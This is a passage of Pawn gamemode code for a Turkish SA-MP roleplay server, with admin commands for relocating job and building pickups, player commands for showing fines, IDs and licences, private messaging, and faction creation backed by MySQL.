				Veriler[aractahtayaziz] = ekZ+1.05;
				GetXYInFrontOfPlayer(playerid, ekX, ekY, ekZ, 1.0);
				Veriler[aractahtax] = ekX;
				Veriler[aractahtay] = ekY;
				Veriler[aractahtaz] = ekZ-1.015;
				Veriler[aractahtarz] = -ekrZ;
				Veriler[aractahtaint] = GetPlayerInterior(playerid);
				Veriler[aractahtavw] = GetPlayerVirtualWorld(playerid);
				Bilgi(playerid, "Araç tahtasýný baþarýyla taþýdýnýz.");
				DestroyDynamicObject(Veriler[aractahtaobje]);
				DestroyDynamicObject(Veriler[aractahtayazi]);
				Veriler[aractahtaobje] = CreateDynamicObject(3077, Veriler[aractahtax], Veriler[aractahtay], Veriler[aractahtaz], 0, 0, Veriler[aractahtarz]);
				SetDynamicObjectMaterial(Veriler[aractahtaobje], 0, 3925, "weemap", "Bow_Abattoir_Conc2");
				Veriler[aractahtayazi] = CreateDynamicObject(19482, Veriler[aractahtayazix], Veriler[aractahtayaziy], Veriler[aractahtayaziz], 0, 0, -Veriler[aractahtarz]-90);
				SetDynamicObjectMaterialText(Veriler[aractahtayazi], 0, AracTahtaEx(), 90, "Arial", 16, 1, -218103808, 0, 1);
				Streamer_Update(playerid);
				VerileriKaydet();
			}
			else if(strcmp(string, "cctv", true) == 0)
			{
				new Float:ekX, Float:ekY, Float:ekZ;
				GetPlayerPos(playerid, ekX, ekY, ekZ);
				Veriler[cctvx] = ekX;
				Veriler[cctvy] = ekY;
				Veriler[cctvz] = ekZ;
				Veriler[cctvint] = GetPlayerInterior(playerid);
				Veriler[cctvvw] = GetPlayerVirtualWorld(playerid);
       			DestroyDynamicPickup(Veriler[cctvpickup]);
			    Veriler[cctvpickup] = CreateDynamicPickup(1239, 1, Veriler[cctvx], Veriler[cctvy], Veriler[cctvz],Veriler[cctvvw],Veriler[cctvint],-1,50);
				Bilgi(playerid, "CCTV'i baþarýyla taþýdýnýz.");
				VerileriKaydet();
			}
			else if(strcmp(string, "ekipman", true) == 0)
			{
				new Float:ekX, Float:ekY, Float:ekZ;
				GetPlayerPos(playerid, ekX, ekY, ekZ);
				Veriler[ekipmanX] = ekX;
				Veriler[ekipmanY] = ekY;
				Veriler[ekipmanZ] = ekZ;
				Veriler[ekipmanint] = GetPlayerInterior(playerid);
				Veriler[ekipmanvw] = GetPlayerVirtualWorld(playerid);
       			DestroyDynamicPickup(Veriler[ekipmanpickup]);
			    Veriler[ekipmanpickup] = CreateDynamicPickup(1239, 1, Veriler[ekipmanX], Veriler[ekipmanY], Veriler[ekipmanZ],Veriler[ekipmanvw],Veriler[ekipmanint],-1,50);
				Bilgi(playerid, "Ekipman odasýný baþarýyla taþýdýnýz.");
				VerileriKaydet();
			}
			else if(strcmp(string, "banka", true) == 0)
			{
				new Float:sevX, Float:sevY, Float:sevZ;
				GetPlayerPos(playerid, sevX, sevY, sevZ);
				Veriler[bankX] = sevX;
				Veriler[bankY] = sevY;
				Veriler[bankZ] = sevZ;
				Veriler[bankint] = GetPlayerInterior(playerid);
				Veriler[bankvw] = GetPlayerVirtualWorld(playerid);
       			DestroyDynamicPickup(Veriler[bankpickup]);
			    Veriler[bankpickup] = CreateDynamicPickup(1239, 1, Veriler[bankX], Veriler[bankY], Veriler[bankZ],0,0,-1,50);
				Bilgi(playerid, "Bankayý baþarýyla taþýdýnýz.");
				VerileriKaydet();
			}
			else if(strcmp(string, "sevkiyat", true) == 0)
			{
				new Float:sevX, Float:sevY, Float:sevZ;
				GetPlayerPos(playerid, sevX, sevY, sevZ);
				Veriler[sevkX] = sevX;
				Veriler[sevkY] = sevY;
				Veriler[sevkZ] = sevZ;
				Veriler[sevkint] = GetPlayerInterior(playerid);
				Veriler[sevkvw] = GetPlayerVirtualWorld(playerid);
       			DestroyDynamicPickup(Veriler[sevkpickup]);
			    Veriler[sevkpickup] = CreateDynamicPickup(1239, 1, Veriler[sevkX], Veriler[sevkY], Veriler[sevkZ],0,0,-1,50);
				Bilgi(playerid, "Sevkiyat mesleðinin pickupýný baþarýyla taþýdýnýz.");
				VerileriKaydet();
			}
			else if(strcmp(string, "isbasi", true) == 0)
			{
			    new Float:isbX, Float:isbY, Float:isbZ;
			    GetPlayerPos(playerid, isbX, isbY, isbZ);
			    Veriler[isbasiX] = isbX;
			    Veriler[isbasiY] = isbY;
			    Veriler[isbasiZ] = isbZ;
			    Veriler[isbasint] = GetPlayerInterior(playerid);
			    Veriler[isbasivw] = GetPlayerVirtualWorld(playerid);
			    Bilgi(playerid, "Isbasi yerini baþarýyla deðiþtirdiniz.");
			    VerileriKaydet();
			}
			else if(strcmp(string, "tutukla", true) == 0)
			{
			    new Float:ttiX, Float:ttiY, Float:ttiZ;
			    GetPlayerPos(playerid, ttiX, ttiY, ttiZ);
			    Veriler[tiX] = ttiX;
			    Veriler[tiY] = ttiY;
			    Veriler[tiZ] = ttiZ;
			    Bilgi(playerid, "/tutukla komutunun posunu baþarýyla deðiþtirdiniz.");
			    VerileriKaydet();
			}
			else if(strcmp(string, "kodes", true) == 0)
			{
			    new Float:ttX, Float:ttY, Float:ttZ;
				GetPlayerPos(playerid, ttX, ttY, ttZ);
				Veriler[tX] = ttX;
				Veriler[tY] = ttY;
				Veriler[tZ] = ttZ;
				Veriler[tint] = GetPlayerInterior(playerid);
				Veriler[tvw] = GetPlayerVirtualWorld(playerid);
				Bilgi(playerid, "Kodes yerini baþarýyla deðiþtirdiniz.");
				VerileriKaydet();
			}
			else if(strcmp(string, "galeripos", true) == 0)
			{
				new Float:gggx, Float:gggy, Float:gggz;
 		    	GetPlayerPos(playerid, gggx, gggy,gggz);
			    Veriler[gposx] = gggx;
			    Veriler[gposy] = gggy;
			    Veriler[gposz] = gggz;
       			DestroyDynamicPickup(Veriler[gpickup]);
			    Veriler[gpickup] = CreateDynamicPickup(1239, 1, Veriler[gposx], Veriler[gposy], Veriler[gposz],0,0,-1,50);
			    Bilgi(playerid, "Galeriyi baþarýyla taþýdýnýz.");
			    VerileriKaydet();
			}
			else if(strcmp(string, "balik", true) == 0)
			{
			    new Float:ekX, Float:ekY, Float:ekZ;
			    GetPlayerPos(playerid, ekX, ekY, ekZ);
			    Veriler[balikX] = ekX;
			    Veriler[balikY] = ekY;
			    Veriler[balikZ] = ekZ;
	      		DestroyDynamicPickup(Veriler[balikpickup]);
		       	Veriler[balikpickup] = CreateDynamicPickup(1239, 1, Veriler[balikX], Veriler[balikY], Veriler[balikZ],0,0,-1,50);
			    Bilgi(playerid, "Balýkçýlýk mesleðini baþarýyla taþýdýnýz.");
			    VerileriKaydet();
			}
			else if(strcmp(string, "taksi", true) == 0)
		    {
			    new Float:ekX, Float:ekY, Float:ekZ;
			    GetPlayerPos(playerid, ekX, ekY, ekZ);
			    Veriler[taksiX] = ekX;
			    Veriler[taksiY] = ekY;
			    Veriler[taksiZ] = ekZ;
	      		DestroyDynamicPickup(Veriler[taksipickup]);
		       	Veriler[taksipickup] = CreateDynamicPickup(1239, 1, Veriler[taksiX], Veriler[taksiY], Veriler[taksiZ],0,0,-1,50);
			    Bilgi(playerid, "Taksicilik mesleðini baþarýyla taþýdýnýz.");
			    VerileriKaydet();
			}
		    else if(!strcmp(string, "reklam", true))
		    {
			    new Float:ekX, Float:ekY, Float:ekZ;
			    GetPlayerPos(playerid, ekX, ekY, ekZ);
			    Veriler[reklamX] = ekX;
			    Veriler[reklamY] = ekY;
			    Veriler[reklamZ] = ekZ;
			    Veriler[reklamint] = GetPlayerInterior(playerid);
	      		if(Veriler[reklampickup] != 0) DestroyDynamicPickup(Veriler[reklampickup]);
		       	Veriler[reklampickup] = CreateDynamicPickup(1239, 1, Veriler[reklamX], Veriler[reklamY], Veriler[reklamZ],-1,Veriler[reklamint],-1,50);
				if(IsValidDynamic3DTextLabel(Veriler[reklamtext])) DestroyDynamic3DTextLabel(Veriler[reklamtext]);
                Veriler[reklamtext] = CreateDynamic3DTextLabel(" /reklam", 0xAFAFAFFF, Veriler[reklamX], Veriler[reklamY], Veriler[reklamZ], 5, .interiorid=Veriler[reklamint]);
				Bilgi(playerid, "Reklam verme yerini baþarýyla taþýdýnýz.");
			    VerileriKaydet();
		    }
		    else if(!strcmp(string, "tezgah", true))
		    {
			    new Float:ekX, Float:ekY, Float:ekZ;
			    GetPlayerPos(playerid, ekX, ekY, ekZ);
			    Veriler[tezgahX] = ekX;
			    Veriler[tezgahY] = ekY;
			    Veriler[tezgahZ] = ekZ;
			    Veriler[tezgahint] = GetPlayerInterior(playerid);
	      		if(Veriler[tezgahpickup] != 0) DestroyDynamicPickup(Veriler[reklampickup]);
		       	Veriler[tezgahpickup] = CreateDynamicPickup(1239, 1, Veriler[tezgahX], Veriler[tezgahY], Veriler[tezgahZ],-1,Veriler[tezgahint],-1,50);
			    Bilgi(playerid, "Tezgah mesleðinin yerini baþarýyla taþýdýnýz.");
			    VerileriKaydet();
		    }
		    else if(!strcmp(string, "pizza", true))
		    {
			    new Float:apizzaX, Float:apizzaY, Float:apizzaZ;
			    GetPlayerPos(playerid, apizzaX, apizzaY, apizzaZ);
			    Veriler[pizzaX] = apizzaX;
			    Veriler[pizzaY] = apizzaY;
			    Veriler[pizzaZ] = apizzaZ;
	      		if(Veriler[pizzapickup] != 0) DestroyDynamicPickup(Veriler[pizzapickup]);
		       	Veriler[pizzapickup] = CreateDynamicPickup(1239, 1, Veriler[pizzaX], Veriler[pizzaY], Veriler[pizzaZ],-1,0,-1,50);
			    Bilgi(playerid, "Pizzacýlýk mesleðinin yerini baþarýyla taþýdýnýz.");
			    VerileriKaydet();
		    }
		    else if(!strcmp(string, "ehliyet", true))
		    {
			    new Float:apizzaX, Float:apizzaY, Float:apizzaZ;
			    GetPlayerPos(playerid, apizzaX, apizzaY, apizzaZ);
			    Veriler[ehliyetX] = apizzaX;
			    Veriler[ehliyetY] = apizzaY;
			    Veriler[ehliyetZ] = apizzaZ;
	      		if(Veriler[ehliyetpickup] != 0) DestroyDynamicPickup(Veriler[pizzapickup]);
		       	Veriler[ehliyetpickup] = CreateDynamicPickup(1239, 1, Veriler[ehliyetX], Veriler[ehliyetY], Veriler[ehliyetZ],-1,0,-1,50);
			    Bilgi(playerid, "Ehliyet yerini baþarýyla taþýdýnýz.");
			    VerileriKaydet();
		    }
		    else if(!strcmp(string, "aracsicil", true))
		    {
			    new Float:apizzaX, Float:apizzaY, Float:apizzaZ;
			    GetPlayerPos(playerid, apizzaX, apizzaY, apizzaZ);
			    Veriler[aracsicilX] = apizzaX;
			    Veriler[aracsicilY] = apizzaY;
			    Veriler[aracsicilZ] = apizzaZ;
	      		if(Veriler[aracsicilpickup] != 0) DestroyDynamicPickup(Veriler[aracsicilpickup]);
		       	Veriler[aracsicilpickup] = CreateDynamicPickup(1239, 1, Veriler[aracsicilX], Veriler[aracsicilY], Veriler[aracsicilZ],-1,0,-1,50);
			    Bilgi(playerid, "Araç sicil temizleme yerini baþarýyla taþýdýnýz.");
			    VerileriKaydet();
		    }
		    else if(!strcmp(string, "otobus", true))
		    {
			    new Float:apizzaX, Float:apizzaY, Float:apizzaZ;
			    GetPlayerPos(playerid, apizzaX, apizzaY, apizzaZ);
			    Veriler[otobusX] = apizzaX;
			    Veriler[otobusY] = apizzaY;
			    Veriler[otobusZ] = apizzaZ;
	      		if(Veriler[otobuspickup] != 0) DestroyDynamicPickup(Veriler[otobuspickup]);
		       	Veriler[otobuspickup] = CreateDynamicPickup(1239, 1, Veriler[otobusX], Veriler[otobusY], Veriler[otobusZ],-1,0,-1,50);
			    Bilgi(playerid, "Otobüs yerini baþarýyla taþýdýnýz.");
			    VerileriKaydet();
		    }
		    else if(Buysa("paintball",string))
		    {
		    	new Float:apizzaX, Float:apizzaY, Float:apizzaZ;
			    GetPlayerPos(playerid, apizzaX, apizzaY, apizzaZ);
			    Veriler[paintX] = apizzaX;
			    Veriler[paintY] = apizzaY;
			    Veriler[paintZ] = apizzaZ;
	      		if(Veriler[paintpickup] != 0) DestroyDynamicPickup(Veriler[paintpickup]);
		       	Veriler[paintpickup] = CreateDynamicPickup(1239, 1, Veriler[paintX], Veriler[paintY], Veriler[paintZ],-1,0,-1,50);
			    Bilgi(playerid, "Paintball yerini baþarýyla taþýdýnýz.");
		 	    VerileriKaydet();
		    }
   		}
		return 1;
	}
	if(strcmp(string, "/cezalarim", true) == 0)
	{
	    if(Karakter[playerid][ceza] >= 1)
	    {
	        new stringx[256];
			SendClientMessage(playerid, COLOR_WHITE, ""C2"[CEZALARIM]");
			format(string, sizeof(string), "{E84D4D}Ceza Ücret: %d$", Karakter[playerid][ceza]);
			SendClientMessage(playerid, 0xE84D4DAA, string);
			format(stringx, sizeof(stringx), "{E84D4D}Ceza Nedeni: %s", Karakter[playerid][cezaneden]);
			SendClientMessage(playerid, 0xE84D4DAA, stringx);
		}
		else
		{
			Hata(playerid, "Ödenmemiþ cezanýz yok.");
		}
		return 1;
	}
	if(strcmp(string, "/cezaode", true) == 0)
	{
	    if(Karakter[playerid][ceza] >= 1)
	    {
	    	if(IsPlayerInRangeOfPoint(playerid, 30.0, -1265.0060,2427.4622,3501.4866))
			{
				if(Karakter[playerid][para] >= Karakter[playerid][ceza])
				{
				    format(string, sizeof(string), "Toplam %d$ ceza ödediniz.",Karakter[playerid][ceza]);
				    GivePlayerCash(playerid, -Karakter[playerid][ceza]);
				    Karakter[playerid][ceza] = 0;
				    Bilgi(playerid, string);
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
			}
			else
			{
			    Hata(playerid, "Cezanýzý ödeyebilmek için LSPD lobisinde olmalýsýnýz.");
			}
	    }
		else
		{
		    Hata(playerid, "Ödenmemiþ cezanýz yok.");
		}
		return 1;
	}

	if(strcmp(string, "/ruhsatgoster", true) == 0)
	{
	    string = strtok(cmdtext, idx);
		if(!strlen(string))
		{
		    Kullanim(playerid, "/ruhsatgoster [oyuncuID]");
		    return 1;
		}
		new eleman = ReturnUser(string);
		if(IsPlayerConnected(eleman))
		{
		    if(eleman != INVALID_PLAYER_ID)
		    {
  				if(ProxDetectorS(15.0, playerid, eleman))
		        {
		            new vid=GetNearestVehicle(playerid);
		            if(!IsValidVehicle(vid)) return Hata(playerid, "Herhangi bir aracýn yakýnýnda deðilsiniz.");
		            if(Arac[vid][aowner] == Karakter[playerid][sqlid] || AracAnahtarKontrol(playerid, vid))
		            {
                    	if(Arac[vid][atip] == 5) format(string,sizeof(string),""C2"[KÝRALIK] "C6"Sahip: "C1"%s "C6"Model: "C1"%s "C6"Plaka: "C1"%s",SQLFromName(Arac[vid][aowner]),VehicleName[GetVehicleModel(vid)-400][0],Arac[vid][aplaka]);
						else if(AracAnahtarKontrol(playerid, vid)) format(string, sizeof(string),""C6"Sahip: "C1"%s "C6"Model: "C1"%s "C6"Plaka: "C1"%s",SQLFromName(Arac[vid][aowner]),VehicleName[GetVehicleModel(vid)-400][0],Arac[vid][aplaka]);
						else format(string,sizeof(string),""C6"Sahip: "C1"%s "C6"Model: "C1"%s "C6"Plaka: "C1"%s",SQLFromName(Arac[vid][aowner]),VehicleName[GetVehicleModel(vid)-400][0],Arac[vid][aplaka]);
						SendClientMessage(eleman, -1,string);
						format(string,sizeof(string),"/me ruhsatý çýkarýr ve %s'a gösterir.",OyuncuAdiniBul(eleman));
						OnPlayerCommandPerformed(playerid,string,0);
		            }
		            else return Hata(playerid, "Bu aracýn ruhsatý sizde yok.");
				}
				else
				{
				    Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
				    return 1;
				}
			}
		}
		else
		{
		    Hata(playerid, "Böyle bir oyuncu yok.");
		    return 1;
		}
		return 1;
	}
	if(strcmp(string, "/ehliyetgoster", true) == 0)
	{
	    string = strtok(cmdtext, idx);
		if(!strlen(string))
		{
		    Kullanim(playerid, "/ehliyetgoster [oyuncuID]");
		    return 1;
		}
		new eleman = ReturnUser(string);
		if(IsPlayerConnected(eleman))
		{
		    if(eleman != INVALID_PLAYER_ID)
		    {
  				if(ProxDetectorS(15.0, playerid, eleman))
		        {
		            if(Karakter[playerid][ehliyet] == 1)
		            {
						SendClientMessage(eleman,COLOR_LINN," ");
						format(string,sizeof(string),""C2"[EHLÝYET]");
						SendClientMessage(eleman,COLOR_LIGHTBLUE,string);
						format(string,sizeof(string),""C2"Ehliyet NO: "C1"%d",Karakter[playerid][ehliyetno]);
						SendClientMessage(eleman,COLOR_GRAD1,string);
						format(string,sizeof(string),""C2"Ýsim Soyisim: "C1"%s",OyuncuAdiniBul(playerid));
						SendClientMessage(eleman,COLOR_GRAD1,string);
						format(string,sizeof(string),""C2"Doðum Yýlý: "C1"%d",2018-Karakter[playerid][yas]);
						SendClientMessage(eleman,COLOR_GRAD1,string);
						format(string,sizeof(string),"/me ehliyetini çýkarýr ve %s'a gösterir.",OyuncuAdiniBul(eleman));
						OnPlayerCommandPerformed(playerid,string,0);
					}
					else
					{
					    Hata(playerid, "Ehliyetiniz yok.");
					    return 1;
					}
				}
				else
				{
				    Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
				    return 1;
				}
			}
		}
		else
		{
		    Hata(playerid, "Böyle bir oyuncu yok.");
		    return 1;
		}
		return 1;
	}
	if(strcmp(string, "/dlisansgoster", true) == 0)
	{
	    string = strtok(cmdtext, idx);
		if(!strlen(string))
		{
		    Kullanim(playerid, "/dlisansgoster [oyuncuID]");
		    return 1;
		}
		new eleman = ReturnUser(string);
		if(IsPlayerConnected(eleman))
		{
		    if(eleman != INVALID_PLAYER_ID)
		    {
  				if(ProxDetectorS(15.0, playerid, eleman))
		        {
		            if(Karakter[playerid][denizlisans] == 1)
		            {
						SendClientMessage(eleman,COLOR_LINN," ");
						format(string,sizeof(string),""C2"[Deniz Lisansý]");
						SendClientMessage(eleman,COLOR_LIGHTBLUE,string);
						format(string,sizeof(string),""C2"Lisans NO: "C1"%d",Karakter[playerid][ehliyetno]);
						SendClientMessage(eleman,COLOR_GRAD1,string);
						format(string,sizeof(string),""C2"Ýsim Soyisim: "C1"%s",OyuncuAdiniBul(playerid));
						SendClientMessage(eleman,COLOR_GRAD1,string);
						format(string,sizeof(string),""C2"Doðum Yýlý: "C1"%d",2018-Karakter[playerid][yas]);
						SendClientMessage(eleman,COLOR_GRAD1,string);
						format(string,sizeof(string),"/me deniz lisansýný çýkarýr ve %s'a gösterir.",OyuncuAdiniBul(eleman));
						OnPlayerCommandPerformed(playerid,string,0);
					}
					else
					{
					    Hata(playerid, "Deniz lisansýnýz yok.");
					    return 1;
					}
				}
				else
				{
				    Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
				    return 1;
				}
			}
		}
		else
		{
		    Hata(playerid, "Böyle bir oyuncu yok.");
		    return 1;
		}
		return 1;
	}
	if(strcmp(string, "/hlisansgoster", true) == 0)
	{
	    string = strtok(cmdtext, idx);
		if(!strlen(string))
		{
		    Kullanim(playerid, "/hlisansgoster [oyuncuID]");
		    return 1;
		}
		new eleman = ReturnUser(string);
		if(IsPlayerConnected(eleman))
		{
		    if(eleman != INVALID_PLAYER_ID)
		    {
  				if(ProxDetectorS(15.0, playerid, eleman))
		        {
		            if(Karakter[playerid][havalisans] == 1)
		            {
						SendClientMessage(eleman,COLOR_LINN," ");
						format(string,sizeof(string),""C2"[Hava Lisansý]");
						SendClientMessage(eleman,COLOR_LIGHTBLUE,string);
						format(string,sizeof(string),""C2"Lisans NO: "C1"%d",Karakter[playerid][ehliyetno]);
						SendClientMessage(eleman,COLOR_GRAD1,string);
						format(string,sizeof(string),""C2"Ýsim Soyisim: "C1"%s",OyuncuAdiniBul(playerid));
						SendClientMessage(eleman,COLOR_GRAD1,string);
						format(string,sizeof(string),""C2"Doðum Yýlý: "C1"%d",2018-Karakter[playerid][yas]);
						SendClientMessage(eleman,COLOR_GRAD1,string);
						format(string,sizeof(string),"/me hava lisansýný çýkarýr ve %s'a gösterir.",OyuncuAdiniBul(eleman));
						OnPlayerCommandPerformed(playerid,string,0);
					}
					else
					{
					    Hata(playerid, "Hava lisansýnýz yok.");
					    return 1;
					}
				}
				else
				{
				    Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
				    return 1;
				}
			}
		}
		else
		{
		    Hata(playerid, "Böyle bir oyuncu yok.");
		    return 1;
		}
		return 1;
	}
	if(strcmp(string, "/kimlikgoster", true) == 0)
	{
	    string = strtok(cmdtext, idx);
		if(!strlen(string))
		{
		    Kullanim(playerid, "/kimlikgoster [oyuncuID]");
		    return 1;
		}
		new eleman = ReturnUser(string);
		if(IsPlayerConnected(eleman))
		{
		    if(eleman != INVALID_PLAYER_ID)
		    {
  				if(ProxDetectorS(15.0, playerid, eleman))
		        {
		            new _ctext[10];
		            switch(Karakter[playerid][cinsiyet])
		            {
		                case 1: _ctext = "Erkek";
		                case 2: _ctext = "Kadýn";
		            }
					SendClientMessage(eleman,COLOR_LINN," ");
					format(string,sizeof(string),""C2"[KÝMLÝK]");
					SendClientMessage(eleman,COLOR_LIGHTBLUE,string);
					format(string,sizeof(string),""C2"Ýsim Soyisim: "C1"%s",OyuncuAdiniBul(playerid));
					SendClientMessage(eleman,COLOR_GRAD1,string);
					format(string,sizeof(string),""C2"Vatandaþlýk NO: "C1"%d",Karakter[playerid][kimlikno]);
					SendClientMessage(eleman,COLOR_GRAD1,string);
					format(string,sizeof(string),""C2"Doðum Yýlý: "C1"%d",2018-Karakter[playerid][yas]);
					SendClientMessage(eleman,COLOR_GRAD1,string);
					format(string,sizeof(string),""C2"Cinsiyet: "C1"%s",_ctext);
					SendClientMessage(eleman,COLOR_GRAD1,string);
					format(string,sizeof(string),"/me kimliðini çýkarýr ve %s'a gösterir.",OyuncuAdiniBul(eleman));
					OnPlayerCommandPerformed(playerid,string,0);
				}
				else
				{
				    Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
				    return 1;
				}
			}
		}
		else
		{
		    Hata(playerid, "Böyle bir oyuncu yok.");
		    return 1;
		}
		return 1;
	}
	if(strcmp(string, "/pm", true) == 0)
	{
		string = strtok(cmdtext,idx);
		if(!strlen(string))
		{
			Kullanim(playerid, "/pm [isim/ID] [mesaj]");
			return 1;
		}
		new aydi = ReturnUse2(string);
        new gMessage[128];
		gMessage = strrest(cmdtext,idx);

		if(!strlen(gMessage))
		{
			Kullanim(playerid, "/pm [ID] [mesaj]");
			return 1;
		}
		if(!IsPlayerConnected(aydi))
		{
			Kullanim(playerid, "/pm [ID] [mesaj]");
			return 1;
		}
		if(playerid != aydi)
		{
			if((PMAcik[aydi] || PMengelle[aydi][playerid]) && Karakter[playerid][adminlevel] < 1)
			{
				Hata(playerid, "Kiþi PM kanalýný kapatmýþ.");
				return 1;
			}
			if(Karakter[aydi][adminlevel] > 1 && Karakter[aydi][adminlevel] < 7 && adminpm[playerid] == 0 && Karakter[playerid][adminlevel] < 1)
			{
                ShowPlayerDialog(playerid, 9393, DIALOG_STYLE_MSGBOX, "UYARI","[!] Oyun içi yetkililere ulaþmadan önce sorunuz varsa /soru kanalýný kullanmayý,\n/rapor komutuna cevap gelmediði takdirde sabýrla beklemeyi unutmayýn.","Anladým","Anladým");
				adminpm[playerid] = 1;
				return 1;
			}
			OnPlayerPrivmsg ( playerid, aydi, gMessage );
			PlaySoundForPlayer(aydi, 1085);
		}
		else
		{
			Hata(playerid, "Kendinize PM gönderemezsiniz.");
		}
		return 1;
	}
	if(strcmp(string, "/r", true) == 0)
	{
        new gMessage[128];
		gMessage = strrest(cmdtext,idx);
		if(!strlen(gMessage))
		{
			Kullanim(playerid, "/r [mesaj]");
			return 1;
		}
		new aydi = lastpm[playerid];
		if(aydi == -1)
		{
			Hata(playerid,"Bu komut son mesaj gönderilen kiþiye PM göndermek için kullanýlýr.");
			return 1;
		}
		if(!IsPlayerConnected(aydi))
		{
			Hata(playerid,"Kiþi oyundan çýkýþ yapmýþ.");
			return 1;
		}
		if(playerid != aydi)
		{
			if((PMAcik[aydi] || PMengelle[aydi][playerid]) && Karakter[playerid][adminlevel] < 1)
			{
				Hata(playerid, "Kiþi PM kanalýný kapatmýþ.");
				return 1;
			}
			OnPlayerPrivmsg ( playerid, aydi, gMessage );
			PlaySoundForPlayer(aydi, 1085);
		}
		else
		{
			Hata(playerid, "Kendinize PM gönderemezsiniz.");
		}
		return 1;
	}
	/*if(strcmp(string, "/pmac", true) == 0)
	{
		PMAcik[playerid] = 0;
		Bilgi(playerid,"Özel mesaj kanalýný açtýnýz. Kapatmak için: (( /pmkapat ))");
		return 1;
	}
	if(strcmp(string, "/pmkapat", true) == 0)
	{
		PMAcik[playerid] = 1;
		Bilgi(playerid,"Artýk özel mesaj almayacaksýnýz. Açmak için: (( /pmac ))");
		return 1;
	}*/
	if(strcmp(string, "/admpmac", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
	    {
			adpmd[playerid] = 1;
			Bilgi(playerid,"Bütün özel mesajlarý açtýnýz.");
		}
		return 1;
	}
	if(strcmp(string, "/admpmkapat", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
	    {
			adpmd[playerid] = 0;
			Bilgi(playerid,"Bütün özel mesajlarý kapattýnýz.");
		}
		return 1;
	}
	//________________________________BÝRLÝK KOMUTLARI______________________________//
	if(!strcmp(string, "/birlikduzenle", true))
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
	    {
	    	ShowPlayerDialog(playerid, 3000, DIALOG_STYLE_LIST, "Oluþum Yönet", "Rütbe isimlerini yönet\nRütbe Maaþlarýný Yönet\nOluþumu Yeniden Adlandýr\nOluþum Tipi\nBirlik Ýþbaþý Pozisyonu\nBirlik Reklam Pozisyonu", "Tamam", "Ýptal");
	    }
	    return 1;
	}
	if(!strcmp(string, "/birlikyarat", true))
	{
	    if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
	    {
			new lengthby = strlen(cmdtext);
			while ((idx < lengthby) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetby = idx;
			new resultby[32];
			while ((idx < lengthby) && ((idx - offsetby) < (sizeof(resultby) - 1)))
			{
				resultby[idx - offsetby] = cmdtext[idx];
				idx++;
			}
			resultby[idx - offsetby] = EOS;
	        if(isnull(resultby)) return Kullanim(playerid, "/birlikyarat [birlik ismi]");
	        new escape[32];
	        mysql_real_escape_string(resultby, escape);
	        format(string, sizeof(string), "INSERT INTO `birlikler` (fisim, rutbe1, rutbe2, rutbe3, rutbe4, rutbe5, rutbe6, rutbe7, rutbe8, rutbe9, rutbe10, rutbe11, rutbe12) VALUES ('%s', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)')", escape);
	        new Cache:cache = mysql_query(string, true);
			new bid = cache_insert_id();
			cache_delete(cache);
			Birlik[bid][sqlid] = bid;
			strmid(Birlik[bid][fisim], resultby, 0, strlen(resultby), 32);
			strmid(Birlik[bid][rutbe1], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe2], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe3], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe4], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe5], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe6], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe7], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe8], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe9], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe10], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe11], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe12], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe13], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe14], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe15], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe16], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe17], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe18], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe19], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe20], "(Yok)", 0, 5, 32);
			Birlik[bid][onay] = 0;
			Birlik[bid][seviye] = 1;
			Birlik[bid][ftip] = 0;
			Birlik[bid][itibar] = 10;
			Birlik[bid][hesapno] = 0;
			Birlik[bid][rfiyat] = 1;
			BirlikKaydet(bid);
			format(string, sizeof(string), "%s adlý oluþum yaratýldý. ID: %d", resultby, bid);
			Bilgi(playerid, string);
	    }
	    return 1;
	}
	if(strcmp(string,"/birlikisim",true) == 0) // komut düzenlenecek, fekþýn id yoksa hata verecek(ÖNEMLÝ)
	{
		if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
		{
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
			    Kullanim(playerid,"/birlikisim [faction id] [birlik adý]");
			    Bilgi(playerid, "Eðer birlik ID'den emin deðilseniz komutu kullanmayýn.");
			    return 1;
   			}
			new id = strval(string);
   			new lengthxfd = strlen(cmdtext);
			while ((idx < lengthxfd) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetxfd = idx;
			new resultxfd[64];
			while ((idx < lengthxfd) && ((idx - offsetxfd) < (sizeof(resultxfd) - 1)))
			{
				resultxfd[idx - offsetxfd] = cmdtext[idx];
				idx++;
			}
			resultxfd[idx - offsetxfd] = EOS;
			if(!strlen(resultxfd))
			{
